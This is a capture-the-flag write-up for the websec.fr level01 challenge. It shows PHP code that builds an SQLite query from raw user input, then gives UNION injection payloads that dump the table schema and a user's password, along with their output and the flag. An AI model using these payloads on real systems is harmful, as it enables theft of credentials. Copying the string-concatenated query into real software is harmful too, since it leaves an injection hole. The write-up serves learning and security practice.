# level01 - 1 point
[Link to the challenge](http://websec.fr/level01)

## Description
```
Nothing fancy
```
This application is used to view the username by the given user ID, it will return the corresponding username from the database.

## Write-up
They provide us the HTTP file related to the challenge. Inside it, we find a PHP script:
``` PHP
<?php
session_start ();

ini_set('display_errors', 'on');
ini_set('error_reporting', E_ALL);

include 'anti_csrf.php';

init_token ();

class LevelOne {
    public function doQuery($injection) {
        $pdo = new SQLite3('database.db', SQLITE3_OPEN_READONLY);
        
        $query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';
        $getUsers = $pdo->query($query);
        $users = $getUsers->fetchArray(SQLITE3_ASSOC);

        if ($users) {
            return $users;
        }

        return false;
    }
}

if (isset ($_POST['submit']) && isset ($_POST['user_id'])) {
    check_and_refresh_token();

    $lo = new LevelOne ();
    $userDetails = $lo->doQuery ($_POST['user_id']);
}
?>
```

If we test the program using `id = 1` we get as a response that the user with this ID is called "levelone".

By quickly looking at the PHP script, we can see that the SQL query is vulnerable to an injection:
``` SQL
$query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';
```

Thus, we can set up a SQL UNION Injection payload to exploit the database search:

``` SQL
1 UNION SELECT null, sql FROM sqlite_master WHERE type='table'; -- used to get the sqlite table schema
```
As a result we get this:
```
Username for given ID: CREATE TABLE users(id int(7), username varchar(255), password varchar(255))

Other User Details:
id ->
username -> CREATE TABLE users(id int(7), username varchar(255), password varchar(255))
```
Nice! Now that we have the table schema, we can leak any user's password. With this in mind, we'll get levelone's password with this payload:
``` SQL
1 UNION SELECT id, password FROM users WHERE id=1; --
```

As a result we get:
```
Username for given ID: WEBSEC{Simple_SQLite_Injection}

Other User Details:
id -> 1
username -> WEBSEC{Simple_SQLite_Injection}
```

Great! The flag is `WEBSEC{Simple_SQLite_Injection}`

**Flag: `WEBSEC{Simple_SQLite_Injection}`**


